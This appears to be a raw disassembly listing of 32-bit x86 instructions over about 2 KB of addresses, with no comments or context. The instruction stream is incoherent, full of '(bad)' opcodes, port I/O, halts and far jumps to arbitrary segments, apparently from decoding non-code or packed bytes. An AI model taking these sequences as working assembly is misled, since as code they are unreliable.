  423870:	push   0xb5a4ba78
  423875:	cld    
  423876:	pop    eax
  423877:	push   ss
  423878:	sbb    BYTE PTR [ecx],ah
  42387a:	and    eax,0xaba899cb
  42387f:	fistp  DWORD PTR [eax+eax*4-0x51]
  423883:	jo     0x4238cc
  423885:	add    DWORD PTR [ecx],0x274607fd
  42388b:	adc    eax,0xf2bbdf1e
  423890:	leave  
  423891:	xor    ecx,DWORD PTR [edx+edi*8+0x33]
  423895:	dec    esi
  423896:	in     al,dx
  423897:	call   DWORD PTR [edx]
  423899:	push   ecx
  42389a:	mov    edi,0x9d673c3c
  42389f:	add    esi,edx
  4238a1:	push   esp
  4238a2:	loop   0x423848
  4238a4:	mov    bl,0x8c
  4238a6:	or     edx,ebx
  4238a8:	push   es
  4238a9:	sbb    ah,BYTE PTR [edx-0x475c85a8]
  4238af:	inc    edx
  4238b0:	jle    0x423877
  4238b2:	imul   ebp,edx,0x79
  4238b5:	push   eax
  4238b6:	ret    0x1802
  4238b9:	xlat   BYTE PTR ds:[ebx]
  4238ba:	jecxz  0x42384f
  4238bc:	cs stc 
  4238be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4238bf:	xchg   edi,eax
  4238c0:	mov    ecx,0x1f600264
  4238c5:	daa    
  4238c6:	into   
  4238c7:	in     al,dx
  4238c8:	push   ss
  4238c9:	pop    es
  4238ca:	pop    ecx
  4238cb:	loope  0x4238ec
  4238cd:	jg     0x4238ed
  4238cf:	jp     0x42388c
  4238d1:	and    dl,BYTE PTR [esi-0x24]
  4238d4:	daa    
  4238d5:	sub    eax,esi
  4238d7:	ret    0x4633
  4238da:	add    ch,BYTE PTR [esi+edx*4+0x67]
  4238de:	inc    esi
  4238df:	cmp    esp,DWORD PTR [edi+ebx*4+0x3b]
  4238e3:	sub    DWORD PTR [esi-0x411baa8a],esi
  4238e9:	popf   
  4238ea:	push   ds
  4238eb:	or     ecx,DWORD PTR [edi+0x61c4c5d6]
  4238f1:	ds add esi,0x2fb9f06
  4238f8:	mov    DWORD PTR [edx+0x3508bcec],ebp
  4238fe:	loopne 0x4238fb
  423900:	adc    eax,esp
  423902:	mov    ebx,0xb8e55824
  423907:	pop    es
  423908:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423909:	xlat   BYTE PTR ds:[ebx]
  42390a:	fwait
  42390b:	out    dx,eax
  42390c:	sub    BYTE PTR [ebx],0xe3
  42390f:	adc    edi,DWORD PTR ds:[edx-0x41]
  423913:	mov    dl,0xc5
  423915:	pushf  
  423916:	dec    edi
  423917:	cmc    
  423918:	iret   
  423919:	(bad)  
  42391a:	data16 daa 
  42391c:	mov    ch,0x71
  42391e:	dec    esp
  42391f:	jmp    0x79f6:0xdf55c4d4
  423926:	int    0x96
  423928:	push   esi
  423929:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42392a:	jmp    0x42398f
  42392c:	ror    BYTE PTR [eax],1
  42392e:	sub    BYTE PTR ds:0x58fcd707,ch
  423934:	push   esi
  423935:	pop    ds
  423936:	mov    ds:0xb1673623,al
  42393b:	xor    eax,0xfa89664b
  423940:	mov    ah,0x42
  423942:	cli    
  423943:	xor    DWORD PTR [esi+0x22216768],0x27
  42394a:	push   edx
  42394b:	pop    esi
  42394c:	inc    esp
  42394d:	mov    al,0x3f
  42394f:	mov    al,ds:0x84b0d26d
  423954:	or     BYTE PTR [edi-0x77],cl
  423957:	mov    ch,0x75
  423959:	nop
  42395a:	hlt    
  42395b:	icebp  
  42395c:	sub    dl,BYTE PTR [eax]
  42395e:	sbb    DWORD PTR [ebx],0x5897f929
  423964:	adc    dh,0x2d
  423967:	xchg   esp,eax
  423968:	pop    ss
  423969:	loope  0x423925
  42396b:	cmp    dh,cl
  42396d:	bound  eax,QWORD PTR [edi+ebx*8-0x3fe276dd]
  423974:	mov    ebp,0x88cd2f62
  423979:	call   0xa4e9:0x8b62da4b
  423980:	adc    al,0xf3
  423982:	popa   
  423983:	push   ebx
  423984:	fidiv  WORD PTR [eax-0x36]
  423987:	fs jnp 0x42390e
  42398a:	jno    0x4239b9
  42398c:	sub    BYTE PTR [ebp-0x20050cc5],bl
  423992:	fistp  DWORD PTR [ebx-0x30]
  423995:	mov    al,0xd1
  423997:	rcr    DWORD PTR [eax],1
  423999:	fnstcw WORD PTR ds:0xfb8ea41c
  42399f:	adc    DWORD PTR [eax-0x2ee0245a],0x3a
  4239a6:	jae    0x4239f9
  4239a8:	sub    DWORD PTR [edx-0x2a9f6db9],eax
  4239ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4239af:	jne    0x423954
  4239b1:	dec    ebx
  4239b2:	aas    
  4239b3:	in     al,dx
  4239b4:	pop    es
  4239b5:	mov    al,ds:0x136a3e4b
  4239ba:	sub    al,0xb6
  4239bc:	dec    ecx
  4239bd:	sbb    BYTE PTR [ebx-0x4765dd78],0xa4
  4239c4:	into   
  4239c5:	aas    
  4239c6:	add    ecx,DWORD PTR [ecx]
  4239c8:	mov    ch,0x5f
  4239ca:	repnz repnz add esi,DWORD PTR [ebx]
  4239ce:	popa   
  4239cf:	or     al,BYTE PTR [ebx-0x27]
  4239d2:	push   ds
  4239d3:	mov    ebp,0xa39f9c81
  4239d8:	and    ebp,DWORD PTR [ecx-0x3c]
  4239db:	out    0x95,al
  4239dd:	shl    BYTE PTR [edi+eiz*8+0x7e64e23f],cl
  4239e4:	mov    eax,0xcd525380
  4239e9:	xchg   esp,eax
  4239ea:	mov    edx,0x19a94594
  4239ef:	popf   
  4239f0:	jl     0x42398b
  4239f2:	fucomi st,st(6)
  4239f4:	adc    edx,edx
  4239f6:	cmp    eax,0xdf7ead2
  4239fb:	cmp    BYTE PTR [edx],bl
  4239fd:	cdq    
  4239fe:	dec    edx
  4239ff:	or     al,0x28
  423a01:	jae    0x423a38
  423a03:	hlt    
  423a04:	das    
  423a05:	fwait
  423a06:	stos   DWORD PTR es:[edi],eax
  423a07:	jecxz  0x4239b2
  423a09:	dec    ebp
  423a0a:	std    
  423a0b:	ror    BYTE PTR es:[eax+ecx*4+0x7b9ced85],cl
  423a13:	clc    
  423a14:	cli    
  423a15:	xor    BYTE PTR [edx+0x66],bl
  423a18:	mov    al,ds:0x16eebf59
  423a1d:	jns    0x4239c7
  423a1f:	js     0x423a84
  423a21:	shl    BYTE PTR [ecx],1
  423a23:	jmp    0x4239d5
  423a25:	cld    
  423a26:	outs   dx,BYTE PTR ds:[esi]
  423a27:	inc    eax
  423a28:	fimul  WORD PTR [edx]
  423a2a:	scas   eax,DWORD PTR es:[edi]
  423a2b:	pop    esi
  423a2c:	dec    edi
  423a2d:	mov    eax,0x8240c6dc
  423a32:	js     0x423a21
  423a34:	jne    0x4239fe
  423a36:	data16 in al,dx
  423a38:	(bad)  
  423a39:	mov    dh,0x58
  423a3b:	jb     0x423a61
  423a3d:	leave  
  423a3e:	mov    ebp,ebx
  423a40:	mov    BYTE PTR [ecx+0x6a],ch
  423a43:	ret    0x9c61
  423a46:	mov    esp,ecx
  423a48:	cmp    al,0xd8
  423a4a:	test   BYTE PTR [esi+ebx*2],0xb
  423a4e:	pop    ds
  423a4f:	imul   esi,DWORD PTR [ebp-0x2b],0x8dad45ae
  423a56:	popf   
  423a57:	icebp  
  423a58:	popa   
  423a59:	call   0xcf69:0x2e38aa4b
  423a60:	add    esp,DWORD PTR cs:[ebx+0x56]
  423a64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423a65:	rcr    dl,1
  423a67:	repz lds esi,FWORD PTR [eax+0x247c64b4]
  423a6e:	sub    cl,ch
  423a70:	push   es
  423a71:	jbe    0x423acc
  423a73:	or     DWORD PTR [edi],edi
  423a75:	ja     0x423a22
  423a77:	or     DWORD PTR [ebp+0x22acb72c],esi
  423a7d:	cmp    DWORD PTR [ebp-0x74],esi
  423a80:	xchg   ecx,eax
  423a81:	scas   al,BYTE PTR es:[edi]
  423a82:	jle    0x423a1f
  423a84:	fs test al,0x2b
  423a87:	in     eax,dx
  423a88:	das    
  423a89:	jp     0x423a7e
  423a8b:	dec    esi
  423a8c:	mov    ds:0xd93d1840,eax
  423a91:	lods   eax,DWORD PTR ds:[esi]
  423a92:	mov    ecx,0xbd91d3f4
  423a97:	ffreep st(5)
  423a99:	ja     0x423a9b
  423a9b:	lock lahf 
  423a9d:	stc    
  423a9e:	cdq    
  423a9f:	xor    eax,0x1ac7dae7
  423aa4:	out    0x9b,eax
  423aa6:	push   edi
  423aa7:	push   edi
  423aa8:	mov    esp,DWORD PTR [esi-0x7eb0b485]
  423aae:	bound  eax,QWORD PTR [ebx]
  423ab0:	mov    al,0x40
  423ab2:	adc    ah,BYTE PTR [edi+ecx*4+0x4]
  423ab6:	mov    dl,0xd4
  423ab8:	inc    esp
  423ab9:	sub    BYTE PTR [edi-0x630e3aa3],dh
  423abf:	jmp    0x1920:0xc0b69ac3
  423ac6:	call   0x2e47:0x54af2936
  423acd:	test   al,0x5b
  423acf:	jp     0x423a71
  423ad1:	dec    esp
  423ad2:	enter  0x4818,0xc8
  423ad6:	sub    DWORD PTR [esi+0x34b8bb08],ebx
  423adc:	push   es
  423add:	inc    eax
  423ade:	imul   eax,DWORD PTR [ebp+0x52326877],0xffffff96
  423ae5:	jnp    0x423acc
  423ae7:	push   esi
  423ae8:	int    0xe1
  423aea:	or     DWORD PTR [eax],eax
  423aec:	mov    ds:0x25e20897,eax
  423af1:	sbb    DWORD PTR [eax+0x67],ebp
  423af4:	push   edi
  423af6:	je     0x423b58
  423af8:	mov    eax,0xfa585b9e
  423afd:	loopne 0x423a81
  423aff:	hlt    
  423b00:	in     al,dx
  423b01:	push   ebx
  423b02:	dec    esi
  423b03:	mov    bh,0xef
  423b05:	and    DWORD PTR [ebp-0x2b06e83a],eax
  423b0b:	jns    0x423b6f
  423b0d:	dec    esi
  423b0e:	fnsave [ebp+ebp*4-0x54]
  423b12:	sti    
  423b13:	cmp    BYTE PTR [ebx-0x41455b88],0xe4
  423b1a:	mov    bh,0x76
  423b1c:	and    al,0x89
  423b1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423b1f:	xchg   ecx,eax
  423b20:	pop    esp
  423b21:	or     edi,esp
  423b23:	sub    al,0xd4
  423b25:	push   0xd918a44f
  423b2a:	aas    
  423b2b:	mov    cl,0x79
  423b2d:	ficomp DWORD PTR [ebp+ecx*4+0x53]
  423b31:	sbb    DWORD PTR [ecx+0x25b97e63],ebp
  423b37:	jp     0x423b1d
  423b39:	push   edi
  423b3a:	jno    0x423b2a
  423b3c:	xor    eax,0x70f06a7d
  423b41:	lods   al,BYTE PTR ds:[esi]
  423b42:	adc    al,BYTE PTR [edx+0x14aebae7]
  423b48:	pop    ds
  423b49:	dec    ebp
  423b4a:	packsswb mm4,QWORD PTR [edi]
  423b4d:	lea    ecx,[esi-0xcfefa83]
  423b53:	out    dx,eax
  423b54:	fadd   QWORD PTR [ecx+0x9164dcf]
  423b5a:	push   eax
  423b5b:	loope  0x423b2c
  423b5d:	lahf   
  423b5e:	dec    ecx
  423b5f:	push   0xfffffff4
  423b61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423b62:	imul   ecx,DWORD PTR [eax-0x259a637e],0xffffff88
  423b69:	xchg   edx,eax
  423b6a:	aad    0x20
  423b6c:	push   eax
  423b6d:	jno    0x423b50
  423b6f:	hlt    
  423b70:	std    
  423b71:	mov    ds:0x998a8343,al
  423b76:	jnp    0x423b6d
  423b78:	and    eax,0x5ef608e5
  423b7d:	rcl    BYTE PTR [esi+0x6b],0x2f
  423b81:	jae    0x423b42
  423b83:	inc    esp
  423b84:	stos   DWORD PTR es:[edi],eax
  423b85:	mov    al,0x6
  423b87:	jne    0x423b7e
  423b89:	out    0xe6,al
  423b8b:	call   0xa620ed81
  423b90:	adc    ebx,edx
  423b92:	xor    BYTE PTR [ecx+ebx*2+0x17],0xdc
  423b97:	bound  esp,QWORD PTR [edx]
  423b99:	add    edx,DWORD PTR [eax+0x37]
  423b9c:	or     dl,BYTE PTR [edi+edi*2-0x73]
  423ba0:	mov    edi,DWORD PTR [ecx+0x16]
  423ba3:	retf   0xceb4
  423ba6:	iret   
  423ba7:	shl    DWORD PTR [edx+0x47d559e4],1
  423bad:	cmp    DWORD PTR [ebx],ecx
  423baf:	idiv   DWORD PTR [ecx]
  423bb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423bb2:	outs   dx,BYTE PTR ds:[esi]
  423bb3:	mov    ebx,0x6ff3b30e
  423bb8:	push   edi
  423bb9:	popa   
  423bba:	sub    eax,0x2a7e45ce
  423bbf:	cmc    
  423bc0:	iret   
  423bc1:	sbb    cl,BYTE PTR [eax-0x124845eb]
  423bc7:	jo     0x423bd1
  423bc9:	xor    DWORD PTR [eax+0x31496d44],0x631a8614
  423bd3:	sbb    BYTE PTR [ebx+esi*2],0x70
  423bd7:	inc    ecx
  423bd8:	xor    edx,DWORD PTR [eax-0x29]
  423bdb:	pop    es
  423bdc:	or     ah,BYTE PTR [ebx-0x24941b44]
  423be2:	in     eax,dx
  423be3:	lea    esp,[esi]
  423be5:	sbb    esi,ebx
  423be7:	pop    ebp
  423be8:	xchg   esi,eax
  423be9:	popf   
  423bea:	ret    
  423beb:	inc    edx
  423bec:	fisub  DWORD PTR [edx+0x707b88b9]
  423bf2:	mov    ecx,0x1e59ca54
  423bf7:	dec    ebx
  423bf8:	in     eax,0xba
  423bfa:	sbb    esp,esi
  423bfc:	test   DWORD PTR [ebx-0x66dffe75],eax
  423c02:	jo     0x423bc9
  423c04:	mov    ah,0x44
  423c06:	mov    ds:0x6ba1d580,eax
  423c0b:	stos   BYTE PTR es:[edi],al
  423c0c:	mov    al,ds:0x59787b13
  423c11:	inc    esp
  423c12:	pop    es
  423c13:	test   DWORD PTR [esi+ebx*1+0x26197529],edi
  423c1a:	pop    ebp
  423c1b:	loop   0x423c08
  423c1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423c1e:	mov    edi,DWORD PTR [edi+0x20]
  423c21:	fs mov esi,0x3cf133a5
  423c27:	pop    ebx
  423c28:	pop    eax
  423c29:	mov    dl,0xb2
  423c2b:	les    ebx,FWORD PTR [ebx+0x1a]
  423c2e:	fldcw  WORD PTR [edx-0xe6d2bfb]
  423c34:	jmp    0x49a160c5
  423c39:	sub    esp,ecx
  423c3b:	inc    esi
  423c3c:	bnd je 0x423bc1
  423c3f:	push   0x6f
  423c41:	xor    al,0xdd
  423c43:	jb     0x423c4a
  423c45:	aas    
  423c46:	cmp    edx,esi
  423c48:	xchg   edi,eax
  423c49:	add    BYTE PTR [edi+ebp*2],ch
  423c4c:	fmul   st(2),st
  423c4e:	cld    
  423c4f:	icebp  
  423c50:	xchg   edx,eax
  423c51:	inc    ecx
  423c52:	jo     0x423bf3
  423c54:	das    
  423c55:	shl    BYTE PTR [ebp+0x70e6617a],cl
  423c5b:	stos   BYTE PTR es:[edi],al
  423c5c:	and    eax,0xafe7f8bf
  423c61:	pop    ds
  423c62:	push   0xd1492518
  423c67:	outs   dx,DWORD PTR ds:[esi]
  423c68:	loope  0x423c54
  423c6a:	(bad)  
  423c6b:	pop    esp
  423c6c:	pop    edx
  423c6d:	adc    al,0x1c
  423c6f:	push   ds
  423c70:	add    al,0xc3
  423c72:	pop    esi
  423c73:	fimul  WORD PTR [ebx-0xb12fb27]
  423c79:	pop    edx
  423c7a:	mov    ?,WORD PTR [edx+0x1d]
  423c7d:	dec    ebp
  423c7e:	fiadd  WORD PTR [ebx-0x63000a21]
  423c84:	aad    0xa7
  423c86:	(bad)  
  423c87:	jmp    0xb31e8695
  423c8c:	and    BYTE PTR [ecx],bl
  423c8e:	or     edi,DWORD PTR [eax]
  423c90:	mov    al,ds:0x19f1ac32
  423c95:	test   al,0x5b
  423c97:	mov    dh,0xe7
  423c99:	mov    dh,0xdd
  423c9b:	aaa    
  423c9c:	lods   al,BYTE PTR ds:[esi]
  423c9d:	mov    es,WORD PTR [edi-0x6c]
  423ca0:	jle    0x423d04
  423ca2:	mov    ecx,0x9c5212e4
  423ca7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423ca8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423ca9:	inc    edi
  423caa:	xchg   bh,al
  423cac:	mul    BYTE PTR [ebx]
  423cae:	add    DWORD PTR [ebx+0x3cb09b00],0x20dc598d
  423cb8:	lods   eax,DWORD PTR ds:[esi]
  423cb9:	and    al,0x55
  423cbb:	int3   
  423cbc:	xlat   BYTE PTR ds:[ebx]
  423cbd:	cmp    BYTE PTR [edi-0x58337aed],bh
  423cc3:	repnz fdivr DWORD PTR [edx]
  423cc6:	jbe    0x423ca3
  423cc8:	push   ds
  423cc9:	sub    DWORD PTR [ebp-0x5d4760c4],edi
  423ccf:	cdq    
  423cd0:	dec    ecx
  423cd1:	leave  
  423cd2:	rcr    BYTE PTR [esi-0x1a085acb],cl
  423cd8:	inc    edx
  423cd9:	retf   
  423cda:	push   edx
  423cdb:	leave  
  423cdc:	sbb    BYTE PTR [ecx],bh
  423cde:	inc    ebx
  423cdf:	mov    al,ds:0x8fbfb862
  423ce4:	sbb    al,0xc
  423ce6:	fadd   QWORD PTR [ecx]
  423ce8:	push   ds
  423ce9:	inc    eax
  423cea:	gs cmp eax,0xed790bef
  423cf0:	sbb    cl,BYTE PTR [ecx]
  423cf2:	frstor [edi]
  423cf4:	adc    dh,ch
  423cf6:	jns    0x423cd6
  423cf8:	mov    al,ds:0xe8139bc6
  423cfd:	jmp    0x24d4:0x271cf0d7
  423d04:	fnstcw WORD PTR [edx-0x55]
  423d07:	out    0xf6,eax
  423d09:	in     eax,dx
  423d0a:	inc    ebp
  423d0b:	fsub   QWORD PTR [ecx]
  423d0d:	or     DWORD PTR [edx-0x4f0572df],ebp
  423d13:	push   ebp
  423d15:	pop    ss
  423d16:	inc    ecx
  423d17:	out    0xf4,al
  423d19:	sbb    cl,BYTE PTR [ebx-0x4b]
  423d1c:	and    DWORD PTR [ecx],ecx
  423d1e:	jecxz  0x423d24
  423d20:	push   0x237f4b84
  423d25:	lea    ebx,ds:0x9fcef0c1
  423d2b:	sbb    ebx,DWORD PTR [eax+0x62175c30]
  423d31:	or     eax,0xcd270cb3
  423d36:	mov    dh,0x44
  423d38:	jbe    0x423d9d
  423d3a:	dec    edx
  423d3b:	scas   al,BYTE PTR es:[edi]
  423d3c:	gs mov esi,0x2e35ebac
  423d42:	out    dx,eax
  423d43:	xchg   edi,eax
  423d44:	daa    
  423d45:	sbb    DWORD PTR [ecx],esp
  423d47:	aam    0xca
  423d49:	and    esi,DWORD PTR [edx-0x26899c4d]
  423d4f:	call   0xf37c:0xebb419c5
  423d56:	sbb    BYTE PTR [ebx],dh
  423d58:	sbb    BYTE PTR [ecx+0x2d961a59],ch
  423d5e:	or     al,0x70
  423d60:	ins    BYTE PTR es:[edi],dx
  423d61:	mov    bl,BYTE PTR [eax+ebx*2-0x354bc631]
  423d68:	ror    BYTE PTR [esi-0x5dbd2b3e],cl
  423d6e:	sub    al,0x69
  423d70:	pop    esp
  423d71:	xor    bh,BYTE PTR [edx+0x187b994]
  423d77:	inc    edx
  423d78:	push   esi
  423d79:	add    al,0xe0
  423d7b:	adc    al,0xfb
  423d7d:	dec    esp
  423d7e:	fisttp DWORD PTR [ebx]
  423d80:	sub    dl,bl
  423d82:	mov    bh,0xf1
  423d84:	xchg   ebx,eax
  423d85:	jge    0x423db2
  423d87:	enter  0xaf8c,0xbb
  423d8b:	add    DWORD PTR [ebp-0x51],esp
  423d8e:	mov    esi,esi
  423d90:	xchg   ebp,eax
  423d91:	lods   al,BYTE PTR ds:[esi]
  423d92:	mov    ?,WORD PTR [ebx+0x23]
  423d95:	xchg   ah,ah
  423d97:	out    dx,eax
  423d98:	cmp    DWORD PTR [ecx],eax
  423d9a:	mov    bl,0xa4
  423d9c:	pop    es
  423d9d:	or     ecx,DWORD PTR [eax-0x60]
  423da0:	inc    ebp
  423da1:	pop    ss
  423da2:	inc    esi
  423da3:	call   0x83a59880
  423da8:	sbb    edi,DWORD PTR [ecx+0x92c7ad]
  423dae:	dec    eax
  423daf:	rcr    BYTE PTR [ebp+0x3f],cl
  423db2:	out    dx,eax
  423db3:	(bad)  
  423db4:	push   ss
  423db5:	imul   ebp,ebx,0x95a5da2a
  423dbb:	jae    0x423d4c
  423dbd:	pop    edx
  423dbe:	loope  0x423dd5
  423dc0:	sbb    BYTE PTR [ecx],bh
  423dc2:	inc    ecx
  423dc3:	shl    BYTE PTR [ecx],0x2e
  423dc6:	fdiv   st,st(4)
  423dc8:	mov    ch,0x1b
  423dca:	in     al,0xf2
  423dcc:	mov    bl,0x8c
  423dce:	sub    eax,0xce892301
  423dd3:	mov    dl,0xd6
  423dd5:	push   ds
  423dd6:	xor    eax,0x8160dd46
  423ddb:	push   ecx
  423ddc:	xchg   ebp,eax
  423ddd:	jmp    0x9edc15fc
  423de2:	clc    
  423de3:	cs or  al,0x11
  423de6:	pop    sp
  423de8:	mov    eax,ss:0x1f83c4ec
  423dee:	lds    edi,FWORD PTR [esi+0x1a]
  423df1:	enter  0xffec,0x0
  423df5:	mov    ecx,DWORD PTR [edi+edx*8-0x16]
  423df9:	call   0x8c8e:0xb58d9df
  423e00:	push   ds
  423e01:	cdq    
  423e02:	fst    DWORD PTR [ecx]
  423e04:	add    al,0xec
  423e06:	mov    al,0x78
  423e08:	xchg   DWORD PTR [edx+0x2f],ecx
  423e0b:	jecxz  0x423e32
  423e0d:	loope  0x423dbe
  423e0f:	push   ds
  423e10:	mov    DWORD PTR [ecx],eax
  423e12:	js     0x423def
  423e14:	retf   
  423e15:	sbb    al,0xcb
  423e17:	and    ah,BYTE PTR ds:0xa9ef2828
  423e1d:	xor    ebp,ebx
  423e1f:	outs   dx,DWORD PTR ds:[esi]
  423e20:	gs jae 0x423e1a
  423e23:	out    0x67,eax
  423e25:	sbb    ecx,edx
  423e27:	mov    al,ds:0xb3288a79
  423e2c:	arpl   WORD PTR [ecx-0x7ee4da06],di
  423e32:	or     al,0x46
  423e34:	sub    ah,BYTE PTR [ecx-0x4bbdb6b5]
  423e3a:	mov    dl,0xcc
  423e3c:	sbb    edi,DWORD PTR [esi]
  423e3e:	and    DWORD PTR [ecx+0x75],esp
  423e41:	(bad)  
  423e42:	fcmovbe st,st(4)
  423e44:	sti    
  423e45:	fwait
  423e46:	(bad)  
  423e47:	mov    ch,0x44
  423e49:	cdq    
  423e4a:	sti    
  423e4b:	je     0x423eac
  423e4d:	inc    eax
  423e4e:	aaa    
  423e4f:	sbb    sp,sp
  423e52:	loope  0x423e89
  423e54:	scas   al,BYTE PTR es:[edi]
  423e55:	js     0x423e0c
  423e57:	add    al,0x91
  423e59:	mov    cl,0xb1
  423e5b:	jmp    0x423de4
  423e5d:	test   BYTE PTR [edi],dl
  423e5f:	iret   
  423e60:	add    BYTE PTR [eax+0x2702b03b],ah
  423e66:	add    bl,al
  423e68:	push   ebp
  423e69:	mov    ecx,0x1b0149f4
  423e6e:	cmp    BYTE PTR [eax],bl
  423e70:	push   ds
  423e71:	inc    ecx
  423e72:	ret    0x3525
  423e75:	mov    al,ds:0x148a1b4b
  423e7a:	sub    ebx,DWORD PTR [ebx-0x72393723]
  423e80:	cmp    BYTE PTR [edx],cl
  423e82:	mov    dh,0x84
  423e84:	fwait
  423e85:	mov    esi,0xbdf5344e
  423e8a:	xchg   edx,eax
  423e8b:	in     eax,dx
  423e8c:	div    DWORD PTR [ebx+0x4a94c611]
  423e92:	xchg   esi,eax
  423e93:	repnz inc esi
  423e95:	sub    DWORD PTR [ebx+0x371fa239],ebp
  423e9b:	(bad)  
  423e9c:	in     al,dx
  423e9d:	mov    ds:0x636f7c6b,al
  423ea2:	lahf   
  423ea3:	dec    ecx
  423ea4:	inc    esi
  423ea5:	mov    bh,0xac
  423ea7:	mov    bh,0x2b
  423ea9:	jle    0x423ee8
  423eab:	test   eax,0xabc1e920
  423eb0:	cmp    cl,BYTE PTR [edi-0x5a]
  423eb3:	xchg   esi,eax
  423eb4:	cmc    
  423eb5:	js     0x423eb4
  423eb7:	lock arpl WORD PTR [edx],sp
  423eba:	shl    DWORD PTR [esi],cl
  423ebc:	xchg   edi,eax
  423ebd:	pop    esi
  423ebe:	fsubrp st(7),st
  423ec0:	xchg   ebp,eax
  423ec1:	jnp    0x423eef
  423ec3:	hlt    
  423ec4:	mov    bh,0x50
  423ec6:	cmp    al,0xda
  423ec8:	ins    DWORD PTR es:[edi],dx
  423ec9:	push   0xdb798a1f
  423ece:	cmp    eax,0x8a566546
  423ed3:	call   DWORD PTR [eax-0x3085861d]
  423ed9:	mov    al,0xbf
  423edb:	jae    0x423f25
  423edd:	sub    bh,0xb4
  423ee0:	mov    ecx,0x3c54e723
  423ee5:	and    eax,eax
  423ee7:	inc    ebp
  423ee8:	and    ebp,DWORD PTR [ecx-0x5f]
  423eeb:	pop    edx
  423eec:	int    0xe4
  423eee:	push   esp
  423eef:	ins    BYTE PTR es:[edi],dx
  423ef0:	and    ecx,ebx
  423ef2:	iret   
  423ef3:	imul   ebp,eax,0x8f38484a
  423ef9:	jp     0x423f38
  423efb:	and    al,0xc8
  423efd:	test   al,0xf7
  423eff:	mov    bl,0xf1
  423f01:	fwait
  423f02:	rcl    BYTE PTR [esi+0x16],cl
  423f05:	test   eax,0xbe7979
  423f0a:	xchg   esp,eax
  423f0b:	test   BYTE PTR [esp+eiz*4+0x1a6a742b],ch
  423f12:	call   0x3f4fcf40
  423f17:	adc    eax,0x54b238d7
  423f1c:	js     0x423f8b
  423f1e:	sbb    eax,0xb08db5b5
  423f23:	std    
  423f24:	jno    0x423f6d
  423f26:	sbb    al,0x7e
  423f28:	shl    DWORD PTR [edi],cl
  423f2a:	xor    al,0xb0
  423f2c:	pushf  
  423f2d:	ret    
  423f2e:	mov    ch,0x4
  423f30:	fs out dx,eax
  423f32:	loopne 0x423f66
  423f34:	in     eax,0xaf
  423f36:	call   0xf3cfde27
  423f3b:	fbstp  TBYTE PTR ds:0xf6486dd0
  423f41:	jmp    0xa7259bd3
  423f46:	aaa    
  423f47:	xchg   BYTE PTR [ebx],ah
  423f49:	mov    edx,0x3cd95991
  423f4e:	pop    eax
  423f4f:	outs   dx,DWORD PTR ds:[esi]
  423f50:	sti    
  423f51:	xor    eax,0x211994b0
  423f56:	sub    al,cl
  423f58:	dec    esp
  423f59:	stos   BYTE PTR es:[edi],al
  423f5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423f5b:	(bad)
  423f5e:	or     DWORD PTR [ebx+eax*8],0xd5f13fad
  423f65:	aad    0xcb
  423f67:	paddq  mm7,mm1
  423f6a:	add    edi,DWORD PTR [ecx]
  423f6c:	pop    ss
  423f6d:	xchg   edx,eax
  423f6e:	cmp    DWORD PTR [esi],ebp
  423f70:	mov    ecx,ebx
  423f72:	mov    bl,bl
  423f74:	xor    ch,BYTE PTR [ecx+0x47]
  423f77:	imul   esi,DWORD PTR [ebx+0x28],0x41b5f9b4
  423f7e:	test   eax,0x979e02ef
  423f83:	pop    ss
  423f84:	xchg   ebx,eax
  423f85:	or     DWORD PTR [ebp-0x2a],ebx
  423f88:	xchg   edx,eax
  423f89:	push   esp
  423f8a:	and    BYTE PTR [ebp-0x77],dh
  423f8d:	lahf   
  423f8e:	out    0x3f,eax
  423f90:	push   0xa7e5bbd6
  423f95:	cmp    eax,0xc41ff92a
  423f9a:	ins    BYTE PTR es:[edi],dx
  423f9b:	mov    bl,0x20
  423f9d:	cmp    edi,eax
  423f9f:	or     al,0xfe
  423fa1:	in     eax,0x6c
  423fa3:	ins    DWORD PTR es:[edi],dx
  423fa4:	sub    al,0x99
  423fa6:	mov    ecx,DWORD PTR [edi]
  423fa8:	icebp  
  423fa9:	mov    ds:0x52597ea7,al
  423fae:	in     eax,0x24
  423fb0:	sbb    ebp,DWORD PTR [ecx-0x24]
  423fb3:	fcmovne st,st(3)
  423fb5:	loopne 0x423f42
  423fb7:	jns    0x424022
  423fb9:	jge    0x423fb8
  423fbb:	mov    cl,0xec
  423fbd:	mov    eax,ds:0xdf27d133
  423fc2:	and    al,0x91
  423fc4:	dec    eax
  423fc5:	mov    DWORD PTR [ebp+0x79],ebp
  423fc8:	bound  edx,QWORD PTR ds:0xae027ce1
  423fce:	jmp    0x2ace7060
  423fd3:	nop
  423fd4:	rol    DWORD PTR [ecx+0x6b31a33c],0x76
  423fdb:	mov    ecx,edx
  423fdd:	xor    BYTE PTR [eax+0x3a085f16],bh
  423fe3:	iret   
  423fe4:	sbb    BYTE PTR [ecx],cl
  423fe6:	mov    bh,0x6f
  423fe8:	outs   dx,BYTE PTR cs:[esi]
  423fea:	pop    ds
  423feb:	ins    DWORD PTR es:[edi],dx
  423fec:	pop    esp
  423fed:	aad    0xb
  423fef:	mov    ds:0x6f0c438b,al
  423ff4:	fwait
  423ff5:	popa   
  423ff6:	mov    edx,0x2d9921e3
  423ffb:	mov    al,ds:0xa72205c6
  424000:	sub    BYTE PTR [edi-0x29460165],ah
  424006:	enter  0x273f,0xd6
  42400a:	imul   esi,DWORD PTR [edi+0x6c951925],0x76e88507
  424014:	and    eax,0x553582cc
  424019:	in     al,0x31
  42401b:	in     eax,dx
  42401c:	inc    esi
  42401d:	stos   BYTE PTR es:[edi],al
  42401e:	add    BYTE PTR [eax-0x25edd6dc],bl
  424024:	xchg   ebp,eax
  424025:	in     eax,dx
  424026:	adc    DWORD PTR [ecx+0x86c79c3],ecx
  42402c:	mov    edi,0xffff1a7c
  424031:	shl    DWORD PTR [edx+0x67b917ac],1
  424037:	xlat   BYTE PTR ds:[ebx]
